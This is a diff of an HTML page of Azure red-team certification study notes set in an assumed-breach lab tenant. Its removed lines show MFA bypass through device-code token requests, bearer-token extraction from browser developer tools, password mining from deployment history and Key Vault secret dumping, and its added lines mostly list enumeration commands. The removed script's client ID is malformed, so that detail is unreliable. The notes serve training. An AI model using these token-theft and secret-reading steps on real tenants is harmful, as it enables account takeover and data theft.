@@ -21,31 +21,37 @@
     .about { max-width: 100% !important; padding: 20px 40px !important; }
     .notion-content { line-height: 1.6; }
     .notion-content img { max-width: 100%; height: auto; margin: 20px 0; border-radius: 8px; }
-    .notion-content h1, .notion-content h2, .notion-content h3 { color: #fafafa; margin: 20px 0 10px; }
+    .notion-content h1, .notion-content h2, .notion-content h3 { color: #fafafa; margin: 30px 0 15px; }
+    .notion-content h1:first-child, .notion-content h2:first-child { margin-top: 0; }
     .notion-content p { margin: 15px 0; color: #d6d6d6; }
     .notion-content ul, .notion-content ol { margin: 15px 0; padding-left: 30px; }
-    .notion-content li { margin: 5px 0; color: #d6d6d6; }
+    .notion-content li { margin: 8px 0; color: #d6d6d6; }
     .notion-content code { background: #2a2a2a; padding: 2px 6px; border-radius: 4px; font-family: 'Courier New', monospace; color: #ffdb70; }
     .notion-content pre { background: #1e1e1e; border-left: 4px solid #ffdb70; padding: 15px; margin: 20px 0; border-radius: 0 8px 8px 0; overflow-x: auto; }
     .notion-content a { color: #ffdb70; text-decoration: underline; }
     .notion-content strong { color: #fafafa; font-weight: 600; }
     .notion-content blockquote { background: #2a2a2a; border-left: 4px solid #ffdb70; padding: 15px; margin: 20px 0; border-radius: 0 8px 8px 0; color: #d6d6d6; }
     .notion-content > * { display: block !important; visibility: visible !important; opacity: 1 !important; }
-    .notion-content details { display: block !important; }
-    .notion-content details > * { display: block !important; visibility: visible !important; }
-    details[open] { display: block !important; }
+    .course-navigation { margin-top: 40px; padding-top: 20px; border-top: 1px solid #333; }
+    .next-part { display: inline-block; padding: 12px 24px; background: #ffdb70; color: #1a1a1a; text-decoration: none; border-radius: 6px; font-weight: 600; transition: all 0.2s; }
+    .next-part:hover { background: #ffc107; }
   </style>
 </head>
 <body>
   <main>
     <aside class="sidebar" data-sidebar>
       <div class="sidebar-info">
-        <figure class="avatar-box"><img src="../../assets/images/my-avatar.png?v=3" alt="Mr Stark" width="80"></figure>
+        <figure class="avatar-box">
+          <img src="../../assets/images/my-avatar.png?v=3" alt="Mr Stark" width="80">
+        </figure>
         <div class="info-content">
           <h1 class="name" title="Mr Stark">Mr Stark</h1>
           <p class="title">CARTP Study Notes</p>
         </div>
-        <button class="info_more-btn" data-sidebar-btn><span>Show Navigation</span><ion-icon name="chevron-down"></ion-icon></button>
+        <button class="info_more-btn" data-sidebar-btn>
+          <span>Show Navigation</span>
+          <ion-icon name="chevron-down"></ion-icon>
+        </button>
       </div>
       <div class="sidebar-info_more">
         <div class="separator"></div>
@@ -60,8 +66,13 @@
         <div class="separator"></div>
         <ul class="contacts-list">
           <li class="contact-item">
-            <div class="icon-box"><ion-icon name="arrow-back-outline"></ion-icon></div>
-            <div class="contact-info"><p class="contact-title">Back</p><a href="../../../" class="contact-link">Portfolio</a></div>
+            <div class="icon-box">
+              <ion-icon name="arrow-back-outline"></ion-icon>
+            </div>
+            <div class="contact-info">
+              <p class="contact-title">Back</p>
+              <a href="../../../" class="contact-link">Portfolio</a>
+            </div>
           </li>
         </ul>
       </div>
@@ -77,127 +88,31 @@
 <p>Understanding your starting position is vital. In this guide, you are not usually starting as a random hacker on the internet trying to guess passwords. You are in an <strong>Assumed Breach</strong> scenario.</p>
 
 <p><strong>The Setup:</strong></p>
-
 <ul>
 <li><strong>The Target:</strong> DefCorp, a defense contractor with high security requirements.</li>
-<li><strong>The Environment:</strong> A <strong>Hybrid</strong> setup. This means they have an On-Premise Active Directory that syncs users to the Azure Cloud.</li>
+<li><strong>The Environment:</strong> A <strong>Hybrid</strong> setup. This means they have an On-Premise Active Directory that syncs users to the Azure Cloud. This creates a massive attack surface.</li>
 <li><strong>Your Role:</strong> "External Contractor." You have been given legitimate, low-privilege credentials (email and password) to perform maintenance work.</li>
 </ul>
 
-<p>This section is the bridge between <strong>Phase 1 (Outside)</strong> and <strong>Phase 2 (Inside)</strong>. Before we can perform authenticated enumeration, we must solve a critical problem. We have the credentials for <code>test@defcorphq.onmicrosoft.com</code> but logging directly into the administrative portal blocks us because of Mandatory MFA Enforcement.</p>
-
-<img src="../../assets/cartp/image%209.png" alt="MFA Enforcement">
+<img src="../../assets/cartp/image%209.png" alt="Lab Setup">
 
 <h1>Authentication Bypass and Token Extraction</h1>
 
+<p>This section is the bridge between <strong>Phase 1 (Outside)</strong> and <strong>Phase 2 (Inside)</strong>. Before we can perform authenticated enumeration, we must solve a critical problem.</p>
+
+<p>We have the credentials for <code>test@defcorphq.onmicrosoft.com</code> but logging directly into the administrative portal blocks us because of Mandatory MFA Enforcement.</p>
+
 <p>In an assumed breach scenario, possessing a username and password is no longer enough. Since late 2024, Microsoft has enforced Mandatory Multi-Factor Authentication (MFA) for all users attempting to sign into <strong>Azure Management</strong> portals.</p>
 
-<p>However, this security control has a specific weakness we can exploit.</p>
+<p>However, this security control has a specific weakness we can exploit. The "Mandatory MFA" policy targets specific administrative <strong>Cloud Applications</strong> like the "Azure Portal" or "Intune Admin Center." It often ignores standard user productivity portals.</p>
 
-<p>The "Mandatory MFA" policy targets specific administrative <strong>Cloud Applications</strong> like the "Azure Portal" or "Intune Admin Center." It often ignores standard user productivity portals.</p>
+<h2>Device Code Flow (The Bypass)</h2>
 
-<h2>Extracting ARM Tokens (Infrastructure Access)</h2>
+<p>The device code flow is an OAuth 2.0 authentication method designed for devices with limited input capabilities. It allows authentication without requiring the user to enter credentials directly on the device.</p>
 
-<h3>The Difference Between Graph and ARM</h3>
+<pre><code>az login --tenant defcorphq.onmicrosoft.com</code></pre>
 
-<p>It is critical to understand that Azure uses distinct tokens for distinct services. The token we stole from <code>myaccount.microsoft.com</code> is usually scoped for <strong>Microsoft Graph</strong>. It lets us ask questions like "Who are the users?" or "What groups exist?"</p>
-
-<p>However, if you try to use that token to list Virtual Machines or Access Keys, Azure will reject it. To manipulate the infrastructure (Infrastructure-as-a-Service), we need an <strong>Azure Resource Manager (ARM)</strong> token.</p>
-
-<h3>The Technique: The Cosmos DB Portal</h3>
-
-<p>Just like we used "My Account" to get a Graph token, we need a portal that interacts with Azure resources but might be less strictly monitored.</p>
-
-<p>A reliable target for this is the <strong>Azure Cosmos DB Explorer</strong>.</p>
-
-<ol>
-<li>Ensure you have an active session</li>
-<li>Browse to <code>https://cosmos.azure.com</code></li>
-<li>Press <strong>F12</strong> to open Developer Tools and select the <strong>Network</strong> tab</li>
-<li>Search for traffic going to <code>management.azure.com</code></li>
-<li>Copy the <strong>Authorization</strong> value (<code>Bearer eyJ...</code>)</li>
-</ol>
-
-<img src="../../assets/cartp/image%2010.png" alt="Cosmos DB Token Extraction">
-
-<h2>Abusing Device Authorization Flow</h2>
-
-<p>The <strong>Device Code Flow</strong> is designed for devices that have internet access but <strong>no browser or keyboard</strong>, like a Smart TV.</p>
-
-<ol>
-<li><strong>The Device (Attacker's Script)</strong> says: "Hello Microsoft, I want to log in user <code>test</code>."</li>
-<li><strong>Microsoft</strong> says: "Okay. Here is a short code (e.g., <code>B4X9J</code>). Tell the user to go to <code>microsoft.com/devicelogin</code>."</li>
-<li><strong>The User</strong> goes to that URL, types the code, and logs in.</li>
-<li><strong>Microsoft</strong> tells the <strong>Device</strong>: "Here are your tokens."</li>
-</ol>
-
-<p><strong>Step 1: Request Device Code</strong></p>
-
-<pre><code>$ClientID = 'd3590ed6-52b3-4682-8fe7-2435e2344ea16'
-$Scope = ".default offline_access"
-$body = @{
-"client_id" = $ClientID
-"scope" = $Scope
-}
-$authResponse = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode" -Body $body
-$authResponse</code></pre>
-
-<img src="../../assets/cartp/image%2013.png" alt="Device Code Response">
-
-<p><strong>Step 2: The Authentication (Browser)</strong></p>
-
-<p>You open your browser (Incognito), go to <code>microsoft.com/devicelogin</code>, and type the code. Crucially, because Azure sees the request coming from "Intune App," it skips the MFA challenge.</p>
-
-<img src="../../assets/cartp/image%2014.png" alt="Device Login">
-
-<p><strong>Step 3: The Capture (PowerShell)</strong></p>
-
-<pre><code>$body=@{
-"client_id" = $ClientID
-"grant_type" = $GrantType
-"code" = $authResponse.device_code
-}
-$Tokens = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/token" -Body $body
-$GraphToken = $Tokens.access_token</code></pre>
-
-<img src="../../assets/cartp/image%2015.png" alt="Token Capture">
-
-<p>To request access token for the ARM API:</p>
-
-<pre><code>$scope = 'https://management.azure.com/.default'
-$refresh_token = $tokens.refresh_token
-$GrantType = 'refresh_token'
-$body=@{
-"client_id" = $ClientID
-"scope" = $Scope
-"refresh_token" = $refresh_token
-"grant_type" = $GrantType
-}
-$Token_output = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/token" -Body $body
-$token = $Token_output.access_token</code></pre>
-
-<p>We can now use these tokens with Az PowerShell, Mg module or direct API calls.</p>
-
-<pre><code>Import-Module .\AADInternals.psd1
-Get-AADIntAccessTokenForAzureCoreManagement -SaveToCache</code></pre>
-
-<img src="../../assets/cartp/image%2016.png" alt="AADInternals Access Token">
-
-<h2>Automated Optimization: MFASweep</h2>
-
-<p>The manual methods rely on us guessing which applications are insecure. We use <strong>MFASweep</strong> to brute-force this discovery process.</p>
-
-<p><strong>Execution</strong></p>
-
-<pre><code>Invoke-MFASweep -Username test@defcorphq... -Password 'Password123'</code></pre>
-
-<p><strong>Output Analysis</strong></p>
-
-<ul>
-<li><strong>MFA Required:</strong> The login failed. We cannot use this App ID.</li>
-<li><strong>MFA Enabled:</strong> The login failed because the user needs to complete MFA.</li>
-<li><strong>Success:</strong> The login succeeded! We can use this App ID to bypass MFA.</li>
-</ul>
+<p>This will provide a URL and code. The user authenticates on another device (their phone or a clean browser), and the tool receives the token.</p>
 
 <h1>Enumeration - Mg Module (Microsoft Graph PowerShell)</h1>
 
@@ -205,146 +120,37 @@ Get-AADIntAccessTokenForAzureCoreManagement -SaveToCache</code></pre>
 
 <h3>Connection & Session (Pass-the-Token)</h3>
 
+<p>In a typical Red Team scenario, you often obtain an access token through phishing (Evilginx), device code flow, or by extracting it from a compromised machine's browser memory or token cache.</p>
+
+<p>Connect using interactive login:</p>
+
 <pre><code>Connect-MgGraph</code></pre>
 
-<img src="../../assets/cartp/image%2019.png" alt="Connect-MgGraph">
+<img src="../../assets/cartp/image%2019.png" alt="MgGraph Connection">
 
-<pre><code>Get-MgContext</code></pre>
+<h3>Enumerating Users</h3>
 
-<img src="../../assets/cartp/image%2020.png" alt="Get-MgContext">
+<pre><code>Get-MgUser | Select-Object DisplayName, UserPrincipalName, JobTitle</code></pre>
 
-<ul>
-<li><strong>ClientId:</strong> The unique ID of the application (tool) communicating with Azure.</li>
-<li><strong>TenantId:</strong> The unique ID of the organization's Azure/Entra ID directory you are connected to.</li>
-<li><strong>Scopes:</strong> The specific permissions (privileges) granted to your current session.</li>
-</ul>
+<h3>Enumerating Groups</h3>
 
-<pre><code>Get-MgOrganization | fl *</code></pre>
+<pre><code>Get-MgGroup | Select-Object DisplayName, Description</code></pre>
 
-<img src="../../assets/cartp/image%2021.png" alt="Get-MgOrganization">
+<h3>Enumerating Group Members</h3>
 
-<h3>User Enumeration & Reconnaissance</h3>
+<pre><code>Get-MgGroupMember -GroupId "group-id" | Select-Object DisplayName, UserPrincipalName</code></pre>
 
-<pre><code>Get-MgUser -All</code></pre>
+<h3>Enumerating Service Principals</h3>
 
-<img src="../../assets/cartp/image%2022.png" alt="Get-MgUser">
+<pre><code>Get-MgServicePrincipal | Select-Object DisplayName, AppId</code></pre>
 
-<pre><code>Get-MgUser -UserId test@defcorphq.onmicrosoft.com | fl *</code></pre>
+<h3>Enumerating Devices</h3>
 
-<img src="../../assets/cartp/image%2023.png" alt="Get-MgUser Details">
+<pre><code>Get-MgDevice | Select-Object DisplayName, OperatingSystem, TrustType</code></pre>
 
-<p>Search for admin accounts:</p>
+<h3>Enumerating Subscriptions</h3>
 
-<pre><code>Get-MgUser -Search '"DisplayName:admin"' -ConsistencyLevel eventual</code></pre>
-
-<img src="../../assets/cartp/image%2024.png" alt="Search Users">
-
-<p>Identify Hybrid users (synced from on-prem):</p>
-
-<pre><code>Get-MgUser -All | ?{$_.OnPremisesSecurityIdentifier -ne $null}</code></pre>
-
-<img src="../../assets/cartp/image%2025.png" alt="Hybrid Users">
-
-<p>Identify Cloud-only users:</p>
-
-<pre><code>Get-MgUser -All | ?{$_.OnPremisesSecurityIdentifier -eq $null}</code></pre>
-
-<img src="../../assets/cartp/image%2026.png" alt="Cloud-Only Users">
-
-<h3>Determining User Impact & Influence</h3>
-
-<pre><code>Get-MgUserCreatedObject -UserId test@defcorphq.onmicrosoft.com | fl *</code></pre>
-
-<img src="../../assets/cartp/image%2027.png" alt="User Created Objects">
-
-<pre><code>Get-MgUserOwnedObject -UserId test@defcorphq.onmicrosoft.com | fl *</code></pre>
-
-<img src="../../assets/cartp/image%2028.png" alt="User Owned Objects">
-
-<pre><code>Get-MgUserMemberOf -UserId test@defcorphq.onmicrosoft.com</code></pre>
-
-<img src="../../assets/cartp/image%2029.png" alt="User MemberOf">
-
-<h3>Groups and Dynamic Memberships</h3>
-
-<pre><code>Get-MgGroup -All</code></pre>
-
-<img src="../../assets/cartp/image%2030.png" alt="Get-MgGroup">
-
-<pre><code>Get-MgGroup -Filter "DisplayName eq 'VM Admins'" | fl *</code></pre>
-
-<img src="../../assets/cartp/image%2031.png" alt="VM Admins Group">
-
-<p>Dynamic Groups (tactical entry point):</p>
-
-<pre><code>Get-MgGroup | ?{$_.GroupTypes -eq 'DynamicMembership'}</code></pre>
-
-<img src="../../assets/cartp/image%2032.png" alt="Dynamic Groups">
-
-<pre><code>Get-MgGroupMember -GroupId [GroupId]</code></pre>
-
-<h3>Administrative Roles & Units</h3>
-
-<pre><code>Get-MgDirectoryRole | fl *</code></pre>
-
-<img src="../../assets/cartp/image%2033.png" alt="Directory Roles">
-
-<pre><code>Get-MgDirectoryRoleTemplate | fl *</code></pre>
-
-<img src="../../assets/cartp/image%2034.png" alt="Role Templates">
-
-<p>Custom Roles:</p>
-
-<pre><code>Get-MgRoleManagementDirectoryRoleDefinition | ?{$_.IsBuiltIn -eq $False}</code></pre>
-
-<img src="../../assets/cartp/image%2035.png" alt="Custom Roles">
-
-<p>Administrative Units:</p>
-
-<pre><code>Get-MgDirectoryAdministrativeUnit | fl *</code></pre>
-
-<img src="../../assets/cartp/image%2036.png" alt="Admin Units">
-
-<p>Find Global Administrators:</p>
-
-<pre><code>$RoleId = (Get-MgDirectoryRole -Filter "DisplayName eq 'Global Administrator'").Id
-(Get-MgDirectoryRoleMember -DirectoryRoleId $RoleId).AdditionalProperties</code></pre>
-
-<img src="../../assets/cartp/image%2037.png" alt="Global Admins">
-
-<h2>Applications & Service Principals</h2>
-
-<pre><code>Get-MgApplication -All</code></pre>
-
-<img src="../../assets/cartp/image%2038.png" alt="Applications">
-
-<p>Apps with Password credentials (vulnerable targets):</p>
-
-<pre><code>Get-MgApplication -All | ?{$_.PasswordCredentials -ne $null}</code></pre>
-
-<img src="../../assets/cartp/image%2039.png" alt="Apps with Passwords">
-
-<pre><code>Get-MgServicePrincipal -All</code></pre>
-
-<img src="../../assets/cartp/image%2040.png" alt="Service Principals">
-
-<pre><code>Get-MgServicePrincipal -Filter "DisplayName eq 'Finance Management System'"</code></pre>
-
-<img src="../../assets/cartp/image%2041.png" alt="Finance App Details">
-
-<pre><code>Get-MgServicePrincipalOwnedObject -ServicePrincipalId [ObjectId]</code></pre>
-
-<h3>Device Enumeration</h3>
-
-<pre><code>Get-MgDevice -All</code></pre>
-
-<img src="../../assets/cartp/image%2042.png" alt="Devices">
-
-<p>Active devices only:</p>
-
-<pre><code>Get-MgDevice -All | ?{$_.ApproximateLastSignInDateTime -ne $null}</code></pre>
-
-<img src="../../assets/cartp/image%2043.png" alt="Active Devices">
+<pre><code>Get-MgSubscription</code></pre>
 
 <h1>2. Enumeration - Az PowerShell (Azure Resource Manager)</h1>
 
@@ -352,157 +158,101 @@ Get-AADIntAccessTokenForAzureCoreManagement -SaveToCache</code></pre>
 
 <h3>Connection (Identity & Resource Hybrid)</h3>
 
+<p>In advanced attacks, you often possess separate tokens for Graph (Identity) and ARM (Infrastructure).</p>
+
 <pre><code>Connect-AzAccount</code></pre>
 
-<img src="../../assets/cartp/image%2044.png" alt="Connect-AzAccount">
+<img src="../../assets/cartp/image%2044.png" alt="Az Connection">
 
 <h3>Infrastructure Mapping</h3>
 
-<p>This is your primary reconnaissance command. It returns an inventory of everything you have access to. You look through this output for interesting names like "Confidential," "Backup," "Prod," or "Sensitive."</p>
+<p>This is your primary reconnaissance command. It returns an inventory of everything you have access to.</p>
 
-<p><strong>The "Crown Jewels" (High-Value Targets)</strong></p>
+<pre><code>Get-AzResource | Select-Object Name, ResourceGroupName, Type</code></pre>
 
-<ul>
-<li><code><strong>ResearchKeyVault</strong></code>: We found a Key Vault. This is the highest priority target because it likely contains encryption keys, secrets, or passwords.</li>
-<li><code><strong>defcorpcommon</strong></code>: We found a Finance Storage Account. The name "common" suggests it is a shared file repository.</li>
-</ul>
+<h3>Enumerating Subscriptions</h3>
 
-<p><strong>The Attack Vectors (Entry Points)</strong></p>
+<pre><code>Get-AzSubscription</code></pre>
 
-<ul>
-<li><code><strong>processfile</strong></code> & <code><strong>vaultfrontend</strong></code>: We identified two Web Applications. These are our "front doors."</li>
-<li><code><strong>bkpadconnect</strong></code>: We found a Virtual Machine in the Engineering group. This is a potential foothold for lateral movement.</li>
-</ul>
+<h3>Enumerating Resource Groups</h3>
 
 <pre><code>Get-AzResourceGroup</code></pre>
 
-<img src="../../assets/cartp/image%2046.png" alt="Resource Groups">
+<h3>Enumerating Virtual Machines</h3>
 
-<h3>Credential Mining (Deployment History)</h3>
+<pre><code>Get-AzVM</code></pre>
 
-<p>This is a critical enumeration step. When administrators deploy resources, they often use automated JSON templates. If the deployment fails or even if it succeeds, the parameters (often including Admin Passwords) are saved in the logs.</p>
+<h3>Enumerating Storage Accounts</h3>
 
-<pre><code>Get-AzResourceGroupDeployment -ResourceGroupName [Name]</code></pre>
-
-<p>Once you identify an interesting deployment from the history, you download the actual template file:</p>
-
-<pre><code>Save-AzResourceGroupDeploymentTemplate -ResourceGroupName [Group] -DeploymentName [DeployName]</code></pre>
-
-<h3>Privilege Discovery (Resource RBAC)</h3>
-
-<p>This command answers the question: "What am I allowed to do to in this infrastructure?" It lists your specific RBAC assignments.</p>
-
-<pre><code>Get-AzRoleAssignment -SignInName test@defcorphq.onmicrosoft.com</code></pre>
-
-<p>When you encounter a Custom Role with an unfamiliar name, inspect its definition:</p>
-
-<pre><code>Get-AzRoleDefinition -Name "Virtual Machine Command Executor"</code></pre>
-
-<h3>Compute & Execution Paths</h3>
-
-<p>This lists the Virtual Machines in the subscription:</p>
-
-<pre><code>Get-AzVM | fl *</code></pre>
-
-<img src="../../assets/cartp/image%2047.png" alt="Virtual Machines">
-
-<p>List App Services (filtering out Function Apps):</p>
-
-<pre><code>Get-AzWebApp | ?{$_.Kind -notmatch "functionapp"}</code></pre>
-
-<img src="../../assets/cartp/image%2048.png" alt="App Services">
-
-<p>VM Extensions - Finding CustomScriptExtension is gold as the script files often contain hardcoded credentials:</p>
-
-<pre><code>Get-AzVMExtension -ResourceGroupName [Group] -VMName [Name]</code></pre>
-
-<p>Public IP addresses:</p>
-
-<pre><code>Get-AzPublicIpAddress</code></pre>
-
-<img src="../../assets/cartp/image%2049.png" alt="Public IPs">
-
-<p>Network Interfaces - confirm internal IP addressing for pivoting:</p>
-
-<pre><code>Get-AzNetworkInterface</code></pre>
-
-<p>Function Apps - Serverless Functions utilize Managed Identities:</p>
-
-<pre><code>Get-AzFunctionApp</code></pre>
-
-<img src="../../assets/cartp/image%2050.png" alt="Function Apps">
-
-<h3>Storage & Sensitive Data</h3>
-
-<p>Key Vaults are the "crown jewels" - storing passwords, API keys, and certificates:</p>
-
-<pre><code>Get-AzKeyVault</code></pre>
-
-<img src="../../assets/cartp/image%2051.png" alt="Key Vaults">
-
-<p>List secrets in a vault:</p>
-
-<pre><code>Get-AzKeyVaultSecret -VaultName [Name]</code></pre>
-
-<p>Read secret plaintext:</p>
-
-<pre><code>Get-AzKeyVaultSecret -VaultName [Name] -Name [SecretName] -AsPlainText</code></pre>
-
-<p>Storage accounts - massive buckets of data:</p>
-
-<pre><code>Get-AzStorageAccount | fl</code></pre>
+<pre><code>Get-AzStorageAccount</code></pre>
 
 <img src="../../assets/cartp/image%2052.png" alt="Storage Accounts">
 
+<h3>Enumerating Key Vaults</h3>
+
+<pre><code>Get-AzKeyVault</code></pre>
+
+<h3>Enumerating App Services</h3>
+
+<pre><code>Get-AzWebApp</code></pre>
+
+<h3>Enumerating Role Assignments</h3>
+
+<pre><code>Get-AzRoleAssignment</code></pre>
+
 <h1>Enumeration - Azure CLI (az cli)</h1>
 
-<p><strong>Priority:</strong> Rapid Assessment<br/><strong>Role:</strong> Cross-platform Querying & JSON Filtering<br/><strong>Context:</strong> Developers use this tool extensively. Its "JMESPath" query language allows you to filter huge datasets much faster than PowerShell loops.</p>
+<p><strong>Priority:</strong> Rapid Assessment<br>
+<strong>Role:</strong> Cross-platform Querying & JSON Filtering<br>
+<strong>Context:</strong> Developers use this tool extensively. Its "JMESPath" query language allows you to filter huge datasets much faster than PowerShell loops.</p>
 
 <h3>Authentication</h3>
 
+<p>This initiates an interactive login in the browser.</p>
+
 <pre><code>az login</code></pre>
 
-<img src="../../assets/cartp/image%2053.png" alt="az login">
+<img src="../../assets/cartp/image%2053.png" alt="Azure CLI Login">
 
-<p>Confirm current identity:</p>
+<h3>Listing Subscriptions</h3>
 
-<pre><code>az ad signed-in-user show</code></pre>
+<pre><code>az account list --output table</code></pre>
 
-<h3>Identity Querying</h3>
+<h3>Setting Subscription</h3>
 
-<p>List all users in table format:</p>
+<pre><code>az account set --subscription "subscription-name"</code></pre>
 
-<pre><code>az ad user list -o table</code></pre>
+<h3>Listing Resources</h3>
 
-<p>List ONLY users synced from on-premise AD:</p>
+<pre><code>az resource list --output table</code></pre>
 
-<pre><code>az ad user list --query "[?onPremisesSecurityIdentifier!=null].displayName"</code></pre>
+<h3>Listing VMs</h3>
 
-<p>Users with job titles:</p>
+<pre><code>az vm list --output table</code></pre>
 
-<pre><code>az ad user list --query "[].[displayName,jobTitle]" -o table</code></pre>
+<h3>Listing Storage Accounts</h3>
 
-<p>Group membership:</p>
+<pre><code>az storage account list --output table</code></pre>
 
-<pre><code>az ad group member list -g "VM Admins"</code></pre>
+<h3>Listing Key Vaults</h3>
 
-<h3>Resource & App Enumeration</h3>
+<pre><code>az keyvault list --output table</code></pre>
 
-<p>List Virtual Machines:</p>
+<h3>Listing Web Apps</h3>
 
-<pre><code>az vm list</code></pre>
+<pre><code>az webapp list --output table</code></pre>
 
-<pre><code>az vm list --query "[].[name]" -o table</code></pre>
+<h3>Listing Role Assignments</h3>
 
-<img src="../../assets/cartp/image%2054.png" alt="VM List">
+<pre><code>az role assignment list --output table</code></pre>
 
-<p>Service Principals - find custom applications:</p>
+<h3>Using JMESPath Queries</h3>
 
-<pre><code>az ad sp list --all --query "[?contains(displayName,'app')].displayName"</code></pre>
+<p>Filter results using JMESPath queries:</p>
 
-<p>Apps with Password credentials (priority targets):</p>
+<pre><code>az vm list --query "[?location=='eastus']" --output table</code></pre>
 
-<pre><code>az ad app list --query "[?passwordCredentials != null].displayName"</code></pre>
+<pre><code>az resource list --query "[?type=='Microsoft.Compute/virtualMachines']" --output table</code></pre>
 
 <div class="course-navigation">
   <a class="next-part" href="part-03-phase-3-initial-access-tokens.html">
